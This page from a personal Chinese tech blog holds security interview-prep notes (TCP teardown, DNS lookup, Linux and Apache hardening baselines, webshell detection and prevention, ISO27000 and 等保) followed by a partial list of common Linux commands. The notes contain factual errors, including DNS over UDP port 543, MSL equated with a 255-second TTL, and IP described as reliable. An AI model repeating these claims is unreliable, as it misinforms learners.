<p>假设Client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说”我Client端没有数据要发给你了”，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，”告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息”。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，”告诉Client端，好了，我这边数据发完了，准备好关闭连接了”。Client端收到FIN报文后，”就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。“，Server端收到ACK后，”就知道可以断开连接了”。Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。Ok，TCP连接就这样关闭了！</p>
<blockquote>
<p>MSL&#x3D;最大段寿命&#x3D;TTL&#x3D;最大生存时间&#x3D;255s</p>
</blockquote>
<h3 id="四层模型"><a href="#四层模型" class="headerlink" title="四层模型"></a>四层模型</h3><ol>
<li>应用层<br>应用层对应于OSI参考模型的高层，为用户提供所需要的各种服务，例如：FTP、Telnet、DNS、SMTP等.</li>
<li>传输层<br>传输层对应于OSI参考模型的传输层，为应用层实体提供端到端的通信功能，保证了数据包的顺序传送及数据的完整性。该层定义了两个主要的协议：传输控制协议（TCP）和用户数据报协议（UDP).<br>TCP协议提供的是一种可靠的、通过“三次握手”来连接的数据传输服务；而UDP协议提供的则是不保证可靠的（并不是不可靠）、无连接的数据传输服务.</li>
<li>网际互联层<br>网际互联层对应于OSI参考模型的网络层，主要解决主机到主机的通信问题。它所包含的协议设计数据包在整个网络上的逻辑传输。注重重新赋予主机一个IP地址来完成对主机的寻址，它还负责数据包在多种网络中的路由。该层有三个主要协议：网际协议（IP）、互联网组管理协议（IGMP）和互联网控制报文协议（ICMP）。<br>IP协议是网际互联层最重要的协议，它提供的是一个可靠、无连接的数据报传递服务。</li>
<li>网络接入层（即主机-网络层）<br>网络接入层与OSI参考模型中的物理层和数据链路层相对应。它负责监视数据在主机和网络之间的交换。事实上，TCP&#x2F;IP本身并未定义该层的协议，而由参与互连的各网络使用自己的物理层和数据链路层协议，然后与TCP&#x2F;IP的网络接入层进行连接。地址解析协议（ARP）工作在此层，即OSI参考模型的数据链路层。</li>
</ol>
<h3 id="当你输入一个网址，点击访问，会发生什么？"><a href="#当你输入一个网址，点击访问，会发生什么？" class="headerlink" title="当你输入一个网址，点击访问，会发生什么？"></a>当你输入一个网址，点击访问，会发生什么？</h3><h4 id="查找DNS记录"><a href="#查找DNS记录" class="headerlink" title="查找DNS记录"></a>查找DNS记录</h4><ol>
<li>查看浏览器缓存</li>
<li>查看系统缓存</li>
<li>查看路由器缓存</li>
<li>查找ISP DNS缓存</li>
<li>递归搜索。根据网址，发送一个DNS请求，UDP请求，端口为543，会请求一个DNS服务器，DNS服务器会不断递归查找这个网址的IP</li>
</ol>
<h4 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h4><ol start="2">
<li>跟获取到的IP建立TCP连接，在TCP连接上发送HTTP报文</li>
<li></li>
</ol>
<h3 id="常见的状态码"><a href="#常见的状态码" class="headerlink" title="常见的状态码"></a>常见的状态码</h3><h3 id="OSI七层"><a href="#OSI七层" class="headerlink" title="OSI七层"></a>OSI七层</h3><p>物理层、数据链路层、网络层、传输层(TCP，UDP)、会话层(RPC，SQL)、表示层(定义数据格式及加密)、应用层(TELNET，HTTP，FTP)</p>
<h4 id="OSI四层"><a href="#OSI四层" class="headerlink" title="OSI四层"></a>OSI四层</h4><h2 id="路由协议"><a href="#路由协议" class="headerlink" title="路由协议"></a>路由协议</h2><h3 id="你搭建过的最复杂的网络设备是什么"><a href="#你搭建过的最复杂的网络设备是什么" class="headerlink" title="你搭建过的最复杂的网络设备是什么"></a>你搭建过的最复杂的网络设备是什么</h3><h3 id="使用过什么硬件设备"><a href="#使用过什么硬件设备" class="headerlink" title="使用过什么硬件设备"></a>使用过什么硬件设备</h3><h2 id="Linux运维"><a href="#Linux运维" class="headerlink" title="Linux运维"></a>Linux运维</h2><h3 id="启动过程"><a href="#启动过程" class="headerlink" title="启动过程"></a>启动过程</h3><h3 id="Linux基线规范"><a href="#Linux基线规范" class="headerlink" title="Linux基线规范"></a>Linux基线规范</h3><p>每个公司有每个公司的基线规范体系，但是答题分为下列五个方面</p>
<h4 id="账号管理和授权"><a href="#账号管理和授权" class="headerlink" title="账号管理和授权"></a>账号管理和授权</h4><ul>
<li>检查特殊账号，是否存在空密码的账户和root权限账户</li>
<li>禁用或删除无用账号</li>
<li>添加口令策略:<code>/etc/login.defs</code>修改配置文件，设置过期时间、连续认证失败次数</li>
<li>禁止root远程登录，限制root用户直接登录。</li>
<li>检查su权限。<code>vi /etc/pam.d/su</code>添加<code>auth required pam_wheel.so group=test</code></li>
</ul>
<h4 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h4><ul>
<li>关闭不必要的服务</li>
<li>SSH服务安全<ul>
<li>不允许root账号直接登录系统，<code>PermitRootLogin=no</code></li>
<li>修改SSH使用的协议版本为2</li>
<li>修改允许密码错误次数（默认6次），<code>MaxAuthTries=3</code></li>
</ul>
</li>
</ul>
<h4 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h4><ul>
<li>设置umask值 <code>vi /etc/profile</code> 添加行 <code>umask 027</code></li>
<li>设置登录超时 <code>vi /etc/profile</code> 修改配置文件，将以 <code>TMOUT=</code> 开头的行注释，设置为 <code>TMOUT=180</code></li>
</ul>
<h4 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h4><ul>
<li>启用syslogd日志，配置日志目录权限，或者设置日志服务器</li>
<li>记录所有用户的登录和操作日志，通过脚本代码实现记录所有用户的登录操作日志，防止出现安全事件后无据可查。<a target="_blank" rel="noopener" href="https://www.alibabacloud.com/help/zh/faq-detail/49809.htm">https://www.alibabacloud.com/help/zh/faq-detail/49809.htm</a></li>
</ul>
<h4 id="IP协议安全要求"><a href="#IP协议安全要求" class="headerlink" title="IP协议安全要求"></a>IP协议安全要求</h4><ul>
<li>远程登录取消telnet采用ssh</li>
<li>设置&#x2F;etc&#x2F;hosts.allow和deny</li>
<li>禁止ICMP重定向</li>
<li>禁止源路由转发</li>
<li>防ssh破解，iptables(对已经建立的所有链接都放行，限制每分钟连接ssh的次数)+denyhost(添加ip拒绝访问)</li>
</ul>
<h3 id="中间件基线规范（APACHE）"><a href="#中间件基线规范（APACHE）" class="headerlink" title="中间件基线规范（APACHE）"></a>中间件基线规范（APACHE）</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.alibabacloud.com/help/zh/faq-detail/52981.htm">https://www.alibabacloud.com/help/zh/faq-detail/52981.htm</a></p>
</blockquote>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><ul>
<li>账号</li>
<li>授权</li>
<li>日志</li>
<li>session过期时间（防ddos</li>
<li>绑定监听地址</li>
</ul>
<h4 id="禁止"><a href="#禁止" class="headerlink" title="禁止"></a>禁止</h4><ul>
<li>目录权限</li>
<li>访问外部文件</li>
<li>CGI</li>
<li>非法HTTP方法（PUT DELETE）</li>
</ul>
<h4 id="隐藏"><a href="#隐藏" class="headerlink" title="隐藏"></a>隐藏</h4><ul>
<li>服务版本号</li>
<li>重定向错误页面</li>
</ul>
<h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><ul>
<li>配置文件</li>
<li>默认安装的无用文件</li>
</ul>
<h3 id="webshell检测思路"><a href="#webshell检测思路" class="headerlink" title="webshell检测思路"></a>webshell检测思路</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u011066706/article/details/51175971">https://blog.csdn.net/u011066706/article/details/51175971</a></p>
</blockquote>
<p>webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。</p>
<p>黑客通过浏览器以HTTP协议访问Web Server上的一个CGI文件，是一个合法的TCP连接，TCP&#x2F;IP的应用层之下没有任何特征，只能在应用层进行检测。黑客入侵服务器，使用webshell，不管是传文件还是改文件，必然有一个文件会包含webshell代码，很容易想到从文件代码入手，这是静态特征检测；webshell运行后，B&#x2F;S数据通过HTTP交互，HTTP请求&#x2F;响应中可以找到蛛丝马迹，这是动态特征检测。</p>
<h4 id="静态检测"><a href="#静态检测" class="headerlink" title="静态检测"></a>静态检测</h4><p>静态检测通过匹配特征码，特征值，危险函数函数来查找webshell的方法，只能查找已知的webshell，并且误报率漏报率会比较高，但是如果规则完善，可以减低误报率，但是漏报率必定会有所提高。</p>
<p>优点是快速方便，对已知的webshell查找准确率高，部署方便，一个脚本就能搞定。缺点漏报率、误报率高，无法查找0day型webshell，而且容易被绕过。</p>
<p>静态检测配合人工</p>
<p>一个检查工具 <a target="_blank" rel="noopener" href="https://github.com/he1m4n6a/findWebshell">https://github.com/he1m4n6a/findWebshell</a></p>
<h4 id="动态检测"><a href="#动态检测" class="headerlink" title="动态检测"></a>动态检测</h4><p>Linux下就是nobody用户起了bash，Win下就是IIS User启动cmd，这些都是动态特征。再者如果黑客反向连接的话，那很更容易检测了，Agent和IDS都可以抓现行。Webshell总有一个HTTP请求，如果我在网络层监控HTTP，并且检测到有人访问了一个从没反问过得文件，而且返回了200，则很容易定位到webshell，这便是http异常模型检测，就和检测文件变化一样，如果非管理员新增文件，则说明被人入侵了。</p>
<p>缺点也很明显，黑客只要利用原文件就很轻易绕过了，并且部署代价高，网站时常更新的话规则也要不断添加。</p>
<h4 id="日志检测"><a href="#日志检测" class="headerlink" title="日志检测"></a>日志检测</h4><p>使用Webshell一般不会在系统日志中留下记录，但是会在网站的web日志中留下Webshell页面的访问数据和数据提交记录。日志分析检测技术通过大量的日志文件建立请求模型从而检测出异常文件，称之为：HTTP异常请求模型检测。</p>
<h4 id="语法检测"><a href="#语法检测" class="headerlink" title="语法检测"></a>语法检测</h4><p>实现关键危险函数的捕捉方式</p>
<h4 id="统计学检测"><a href="#统计学检测" class="headerlink" title="统计学检测"></a>统计学检测</h4><p>webshell由于往往经过了编码和加密，会表现出一些特别的统计特征，根据这些特征统计学习。<br>典型的代表: NeoPI – <a target="_blank" rel="noopener" href="https://github.com/Neohapsis/NeoPI">https://github.com/Neohapsis/NeoPI</a></p>
<h4 id="防范webshell"><a href="#防范webshell" class="headerlink" title="防范webshell"></a>防范webshell</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/nohaoye/article/details/46987587">https://blog.csdn.net/nohaoye/article/details/46987587</a></p>
</blockquote>
<p>防范的措施大概有三种，第一种的思路是将专门存放上传文件的文件夹里面的脚本类型文件，解析成其他类型的文件，服务器不会以脚本类型来执行它。第二种是匹配文件夹里的脚本类型文件，将其设置为无法读取及操作。第三种是将文件上传到一个单独的文件夹，给一个二级的域名，然后不给这个虚拟站点解析脚本的权限，听说很多网站都用这种方式。</p>
<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/kx_nullpointer/article/details/21299873">https://blog.csdn.net/kx_nullpointer/article/details/21299873</a></p>
</blockquote>
<ol>
<li><code>at</code></li>
<li><code>batch</code></li>
<li><code>crontab</code></li>
<li><code>anacron</code>：检测停机期间应该执行但是没有执行的任务，将检测到的任务检测一次</li>
</ol>
<h3 id="自动化运维编写过什么脚本"><a href="#自动化运维编写过什么脚本" class="headerlink" title="自动化运维编写过什么脚本"></a>自动化运维编写过什么脚本</h3><h3 id="yum用的什么源（本地自搭，挂载）"><a href="#yum用的什么源（本地自搭，挂载）" class="headerlink" title="yum用的什么源（本地自搭，挂载）"></a>yum用的什么源（本地自搭，挂载）</h3><h3 id="awk-sed的使用"><a href="#awk-sed的使用" class="headerlink" title="awk sed的使用"></a>awk sed的使用</h3><h3 id="排错思路，排错经验"><a href="#排错思路，排错经验" class="headerlink" title="排错思路，排错经验"></a>排错思路，排错经验</h3><p>网络 防火墙 配置 权限</p>
<h3 id="日志分析ELK的使用和分析"><a href="#日志分析ELK的使用和分析" class="headerlink" title="日志分析ELK的使用和分析"></a>日志分析ELK的使用和分析</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/21427267">https://www.zhihu.com/question/21427267</a></p>
</blockquote>
<ul>
<li>Elasticsearch是个开源分布式搜索引擎，它的特点有：分布式，零配置，自动发现，索引自动分片，索引副本机制，restful风格接口，多数据源，自动搜索负载等。</li>
<li>Logstash是一个完全开源的工具，他可以对你的日志进行收集、过滤，并将其存储供以后使用（如，搜索）。</li>
<li>Kibana 也是一个开源和免费的工具，它Kibana可以为 Logstash 和 ElasticSearch 提供的日志分析友好的 Web 界面，可以帮助您汇总、分析和搜索重要数据日志。</li>
</ul>
<p>举例-阿里规范<br>用户历史命令记录</p>
<p>缺点：安全性不够。使用x-pack实现安全认证及权限管理功能</p>
<h4 id="事件发生的分析"><a href="#事件发生的分析" class="headerlink" title="事件发生的分析"></a>事件发生的分析</h4><h3 id="用户权限管理-修改"><a href="#用户权限管理-修改" class="headerlink" title="用户权限管理(修改)"></a>用户权限管理(修改)</h3><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><h3 id="IPsec-VPN"><a href="#IPsec-VPN" class="headerlink" title="IPsec VPN"></a>IPsec VPN</h3><h3 id="安全监控工具"><a href="#安全监控工具" class="headerlink" title="安全监控工具"></a>安全监控工具</h3><ul>
<li>web进入-&gt;堡垒机-&gt;内部防御HIDS-&gt;内部监控，日志审计</li>
<li>zabbix性能监控工具 </li>
<li>HIDS</li>
</ul>
<h3 id="Linux木马查杀"><a href="#Linux木马查杀" class="headerlink" title="Linux木马查杀"></a>Linux木马查杀</h3><h3 id="常见的设备有啥"><a href="#常见的设备有啥" class="headerlink" title="常见的设备有啥"></a>常见的设备有啥</h3><ul>
<li>防火墙 utm 负载均衡设备</li>
<li>IPS IDS(HIDS基于主机型入侵检测系统)</li>
<li>堡垒机</li>
<li>蜜罐</li>
<li>网闸</li>
<li>waf</li>
<li>扫描器</li>
<li>soc(ossim开源安全信息管理系统)</li>
</ul>
<h2 id="Windows运维"><a href="#Windows运维" class="headerlink" title="Windows运维"></a>Windows运维</h2><h3 id="基线规范"><a href="#基线规范" class="headerlink" title="基线规范"></a>基线规范</h3><h3 id="木马查杀"><a href="#木马查杀" class="headerlink" title="木马查杀"></a>木马查杀</h3><p>脱壳，反汇编</p>
<h3 id="计划任务-1"><a href="#计划任务-1" class="headerlink" title="计划任务"></a>计划任务</h3><ol>
<li><p>控制面板-管理工具-计划任务，在“任务计划程序库”上右键–创建基本任务</p>
</li>
<li><p><code>schtasks</code>命令<br>语法:<br><code>schtasks /create /tn TaskName /tr TaskRun /sc schedule [/mo modifier] [/d day] [/m month[,month...] [/i IdleTime] [/st StartTime] [/sd StartDate] [/ed EndDate] [/scomputer [/u [domain]user /p password]] [/ru &#123;[Domain]User | &quot;System&quot;&#125; [/rpPassword]] /?</code></p>
</li>
</ol>
<h2 id="ISO27000和等保-重点等保"><a href="#ISO27000和等保-重点等保" class="headerlink" title="ISO27000和等保(重点等保)"></a>ISO27000和等保(重点等保)</h2><h3 id="说一下ISO27000"><a href="#说一下ISO27000" class="headerlink" title="说一下ISO27000"></a>说一下ISO27000</h3><p>ISO27000是国际知名的信息安全管理体系标准，适用于整个企业，不仅仅是IT部门，还包括业务部门、财务、人事等部门。引入信息安全管理体系就可以协调各个方面信息管理，从而使管理更为有效。保证信息安全不是仅有一个防火墙，或找一个24小时提供信息安全服务的公司就可以达到的。它需要全面的综合管理。</p>
<p>PDCA（plan do check action）管理循环</p>
<h3 id="说一下等级保护制度"><a href="#说一下等级保护制度" class="headerlink" title="说一下等级保护制度"></a>说一下等级保护制度</h3><p>《信息安全等级保护管理办法》是为规范信息安全等级保护管理，提高信息安全保障能力和水平，维护国家安全、社会稳定和公共利益，保障和促进信息化建设，根据《中华人民共和国计算机信息系统安全保护条例》等有关法律法规而制定的办法。</p>
<h3 id="差异"><a href="#差异" class="headerlink" title="差异"></a>差异</h3><blockquote>
<p>浅谈信息安全等级保护与ISO27000系列标准的异同 ISSN 1009-3044</p>
</blockquote>
<p>等保是以国家安全、社会秩序和公共利益为出发点，构建国家的安全保障体系。27000系列是以保证组织业务的连续性，缩减业务风险，最大化投资收益为目的，保证组织的业务安全</p>
<h3 id="共性"><a href="#共性" class="headerlink" title="共性"></a>共性</h3><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><h3 id="排序算法：快排-二分-冒泡"><a href="#排序算法：快排-二分-冒泡" class="headerlink" title="排序算法：快排 二分 冒泡"></a>排序算法：快排 二分 冒泡</h3><h2 id="LDAP注入"><a href="#LDAP注入" class="headerlink" title="LDAP注入"></a>LDAP注入</h2><blockquote>
<p><a target="_blank" rel="noopener" href="http://www.4hou.com/technology/9090.html">http://www.4hou.com/technology/9090.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/quiet_girl/article/details/50716312">https://blog.csdn.net/quiet_girl/article/details/50716312</a></p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://acindm.github.io/2024/03/20/%E5%B8%B8%E7%94%A8Linux%E5%91%BD%E4%BB%A4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="Welcome to the 1/30000 🫧">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="acind の blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/03/20/%E5%B8%B8%E7%94%A8Linux%E5%91%BD%E4%BB%A4/" class="post-title-link" itemprop="url">常用Linux命令</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-03-20 22:56:00" itemprop="dateCreated datePublished" datetime="2024-03-20T22:56:00+08:00">2024-03-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-03-21 22:56:53" itemprop="dateModified" datetime="2024-03-21T22:56:53+08:00">2024-03-21</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.9k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>7 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="常用linux命令"><a href="#常用linux命令" class="headerlink" title="常用linux命令"></a>常用linux命令</h3><p>绝大部分云基础设施和托管服务都在Linux操作系统中运行，所以了解甚至熟知Linux命令是至关重要的</p>
<p>之前看一个师傅说把电脑刷成Linux机的话对计算机一些底层原理的了解会更深入（我有进行这个尝试的想法hhh，毕竟全命令行操作确实很酷！</p>
<p>以下是Linux较全的命令收录👇🏻一些常用的不常用但是有一定概率会用到的都有收录</p>
<p>​        </p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">启动terminal（终端）Ctrl+ Alt +T</span><br></pre></td></tr></table></figure>

<h4 id="🎞️最常用命令"><a href="#🎞️最常用命令" class="headerlink" title="🎞️最常用命令"></a>🎞️最常用命令</h4><ol>
<li><p><strong><code>ls</code> – 列出目录内容</strong></p>
</li>
<li><p><strong><code>cd</code> – 更改目录</strong></p>
</li>
<li><p><strong><code>mkdir</code> – 创建新目录</strong></p>
</li>
<li><p><strong><code>rmdir</code> – 删除目录</strong></p>
</li>
<li><p><strong><code>touch</code> – 创建新的空文件</strong></p>
</li>
<li><p><strong><code>cp</code> – 复制文件和目录</strong></p>
</li>
<li><p><strong><code>mv</code> – 移动或重命名文件和目录</strong></p>
</li>
<li><p><strong><code>rm</code> – 移除文件和目录</strong></p>
</li>
<li><p><strong><code>find</code></strong> <strong>– 在目录层次结构中搜索文件</strong></p>
</li>
<li><p><strong><code>du</code></strong> <strong>– 估算文件空间使用情况</strong></p>
</li>
<li><p><strong><code>grep</code></strong> <strong>命令 – 使用条件匹配搜索文本</strong></p>
</li>
<li><p><strong><code>awk</code></strong> <strong>– 条件扫描和处理语言</strong></p>
</li>
<li><p><strong><code>sed</code></strong> <strong>– 用于过滤和转换文本的流编辑器</strong></p>
</li>
<li><p><strong><code>sort</code></strong> <strong>– 对文本文件行进行排序</strong></p>
</li>
<li><p><strong><code>uniq</code></strong> <strong>– 报告或省略重复行</strong></p>
</li>
<li><p><strong><code>diff</code></strong> <strong>– 逐行比较文件</strong></p>
</li>
<li><p><strong><code>wc</code></strong> <strong>– 打印行数、字数和字节数</strong></p>
</li>
<li><p><strong><code>&gt;</code></strong> <strong>– 重定向标准输出</strong></p>
<p>重定向标准输出有助于将命令结果保存到文件中，以便存储、调试或将命令串联起来</p>
</li>
<li><p><strong><code>&gt;&gt;</code></strong> <strong>– 追加标准输出</strong></p>
<p><code>&gt;&gt;</code> 操作符将命令的标准输出追加到文件中，而不覆盖现有内容</p>
</li>
<li><p><strong><code>&lt;</code></strong> <strong>– 重定向标准输入</strong></p>
<p><code>&lt;</code> 重定向操作符将文件内容作为标准输入送入命令，而不是从键盘输入</p>
</li>
<li><p><strong><code>|</code></strong> <strong>– 管道输出到另一条命令</strong></p>
<p>管道 <code>|</code> 操作符将一条命令的输出作为输入发送到另一条命令，将它们串联起来</p>
<p>管道通常用于将命令串联起来，其中一个命令的输出为另一个命令的输入提供信息。这样就能从较小的单用途程序中构建出复杂的操作</p>
</li>
<li><p><strong><code>tee</code></strong> <strong>– 从标准输入读取并写入标准输出和文件</strong></p>
<p><code>tee</code> 命令将标准输入分为两个流</p>
<p>它将输入写入标准输出（显示主命令的输出），同时将副本保存到文件中</p>
<h4 id="🎞️Linux归档命令"><a href="#🎞️Linux归档命令" class="headerlink" title="🎞️Linux归档命令"></a>🎞️Linux归档命令</h4></li>
<li><p><strong><code>tar</code></strong> <strong>– 从归档文件中存储和提取文件</strong></p>
<p><code>tar</code> 命令可帮助你处理磁带归档文件（.tar）。它可以帮助你将多个文件和目录捆绑到一个压缩的 .tar 文件中</p>
</li>
<li><p><strong><code>gzip</code></strong> <strong>– 压缩或扩展文件</strong></p>
<p>gzip 命令使用 LZ77 编码压缩文件，以减小存储或传输文件的大小。使用 gzip，你可以处理 .gz 文件</p>
</li>
<li><p><strong><code>gunzip</code></strong> <strong>– 解压缩文件</strong></p>
<p><code>gunzip</code> 命令用于解压缩 .gz 文件</p>
</li>
<li><p><strong><code>zip</code></strong> <strong>– 打包和压缩文件</strong></p>
<p><code>zip</code> 命令用于创建包含压缩文件内容的 .zip 归档文件</p>
</li>
<li><p><strong><code>unzip</code></strong> <strong>– 从 ZIP 档案中提取文件</strong></p>
<p>与 <code>gunzip</code> 类似， <code>unzip</code> 命令可从 .zip 压缩文件中提取和解压缩文件</p>
<h4 id="Linux文件传输命令"><a href="#Linux文件传输命令" class="headerlink" title="Linux文件传输命令"></a>Linux文件传输命令</h4></li>
<li><p><strong><code>scp</code></strong> <strong>– 在主机间安全复制文件</strong></p>
<p><code>scp</code> （安全复制）命令通过 SSH 连接在主机间复制文件。所有数据传输都经过加密，以确保安全</p>
<h4 id="更多Linux命令"><a href="#更多Linux命令" class="headerlink" title="更多Linux命令"></a>更多Linux命令</h4></li>
<li><p><strong><code>mount</code></strong> – 将硬盘安装或 “连接 “到系统上</p>
</li>
<li><p><strong><code>umount</code></strong> – 从系统中卸载或 “移除” 硬盘。 </p>
</li>
<li><p>**<code>xargs </code>**– 生成并执行通过标准输入提供的命令。</p>
</li>
<li><p><strong><code>alias</code></strong> – 为冗长或复杂的命令创建快捷方式</p>
</li>
<li><p><strong><code>jobs</code> – 列出当前在后台运行任务的程序</strong></p>
</li>
<li><p><strong><code>bg</code> – 恢复已停止或暂停的后台进程</strong></p>
</li>
<li><p><strong><code>killall</code> – 通过程序名称而不是 PID 终止进程</strong></p>
</li>
<li><p><strong><code>history</code> – 显示当前终端会话中以前使用过的命令</strong></p>
</li>
<li><p><strong><code>man</code> – 直接在终端中访问命令的帮助手册</strong></p>
</li>
<li><p><strong><code>screen</code> – 从一个窗口管理多个终端会话。</strong></p>
</li>
<li><p><strong><code>ssh</code> – 建立与远程服务器的安全加密连接</strong></p>
</li>
<li><p><strong><code>tcpdump</code> – 根据特定标准捕获网络流量</strong></p>
</li>
<li><p><strong><code>watch</code> – 每隔一段时间重复一次命令，并突出显示输出差异</strong></p>
</li>
<li><p><strong><code>nc</code> – 打开 TCP 或 UDP 连接，进行测试和数据传输</strong></p>
</li>
<li><p><strong><code>nmap</code> – 主机发现、端口扫描和操作系统指纹</strong></p>
</li>
<li><p><strong><code>strace</code> – 通过跟踪操作系统信号和调用来调试进程</strong></p>
</li>
<li><p><strong><code>unalias</code>– 顾名思义，<code>unalias</code>命令旨在从已定义的别名中删除<code>alias</code></strong></p>
</li>
<li><p><strong><code>pwd</code>– 代表“打印工作目录”，它输出您所在目录的绝对路径</strong></p>
</li>
<li><p><strong><code>./</code> – .&#x2F; 符号本身不是命令，但在这个列表中值得一提。</strong><br>它允许shell直接从终端运行可执行文件，并在系统中安装任何解释器</p>
</li>
<li><p><strong><code>exit</code>– 自动关闭正在使用的终端</strong></p>
</li>
<li><p><strong><code>apt</code>, <code>yum</code>, <code>pacman</code> 命令</strong><br>无论使用的是哪个Linux发行版，都可能使用package管理器来安装、更新和删除每天使用的软件</p>
<p><strong>1. Debian-based (Ubuntu, Linux Mint)</strong></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gimp</span><br></pre></td></tr></table></figure>


<p><strong>2. Red Hat-based (Fedora, CentOS)</strong></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install gimp</span><br></pre></td></tr></table></figure>


<p><strong>3. Arch-based (Manjaro, Arco Linux)</strong></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S gimp</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>echo</code>– 在终端中显示定义的文本</strong></p>
</li>
<li><p><strong><code>cat</code>– 用于直接从终端创建、查看和连接文件。</strong></p>
<p><strong><code>cat</code></strong> 是“concatenate”的缩写，用于直接从终端创建、查看和连接文件。它主要用于在不打开图形文本编辑器的情况下预览文件</p>
</li>
<li><p><strong><code>vim</code>– 使用高效的键绑定编辑纯文本文件</strong></p>
</li>
<li><p><strong><code>which</code>– 输出shell命令的完整路径。</strong><br><code>which</code>命令输出shell命令的完整路径</p>
</li>
<li><p><strong><code>shred</code>– 此命令会重复覆盖文件的内容。</strong><br>此命令会重复覆盖文件的内容，给定的文件极难恢复</p>
</li>
<li><p><strong><code>tail</code>– 打印文件内容后几行</strong></p>
</li>
<li><p><strong><code>head</code>– 输出文本文件的前10行</strong></p>
</li>
<li><p><strong><code>whatis</code>– 打印任何其他命令的说明</strong></p>
</li>
<li><p><strong><code>neofetch</code>– CLI（命令行界面）工具。</strong><br>Neofetch是一个CLI（命令行界面）工具，它在Linux发行版的ASCII徽标旁边显示有关系统的信息，如内核版本、shell和硬件</p>
</li>
<li></li>
<li><p><strong><code>less</code>– 允许您前后检查文件的程序</strong></p>
</li>
<li><p><strong><code>tmux</code> – 用于持续会话和分割的终端多路复用器</strong></p>
</li>
</ol>
<h4 id="速查常用Linux命令"><a href="#速查常用Linux命令" class="headerlink" title="速查常用Linux命令"></a>速查常用Linux命令</h4><table>
<thead>
<tr>
<th>ls</th>
<th>列出目录的内容</th>
</tr>
</thead>
<tbody><tr>
<td>alias</td>
<td>定义或显示别名</td>
</tr>
<tr>
<td>unalias</td>
<td>删除别名定义</td>
</tr>
<tr>
<td>pwd</td>
<td>打印工作目录</td>
</tr>
<tr>
<td>cd</td>
<td>更改目录</td>
</tr>
<tr>
<td>cp</td>
<td>复制文件和目录</td>
</tr>
<tr>
<td>rm</td>
<td>删除文件和目录</td>
</tr>
<tr>
<td>mv</td>
<td>移动（重命名）文件和目录</td>
</tr>
<tr>
<td>mkdir</td>
<td>创建目录</td>
</tr>
<tr>
<td>man</td>
<td>显示其他命令的手册页面</td>
</tr>
<tr>
<td>touch</td>
<td>创建空文件</td>
</tr>
<tr>
<td>chmod</td>
<td>更改文件权限</td>
</tr>
<tr>
<td>.&#x2F;</td>
<td>运行可执行文件</td>
</tr>
<tr>
<td>exit</td>
<td>退出当前shell会话</td>
</tr>
<tr>
<td>sudo</td>
<td>以超级用户身份执行命令</td>
</tr>
<tr>
<td>shutdown</td>
<td>关闭您的机器</td>
</tr>
<tr>
<td>htop</td>
<td>显示进程和资源信息</td>
</tr>
<tr>
<td>unzip</td>
<td>解压zip文件</td>
</tr>
<tr>
<td>apt,yum,pacman</td>
<td>包管理器</td>
</tr>
<tr>
<td>echo</td>
<td>显示文本行</td>
</tr>
<tr>
<td>cat</td>
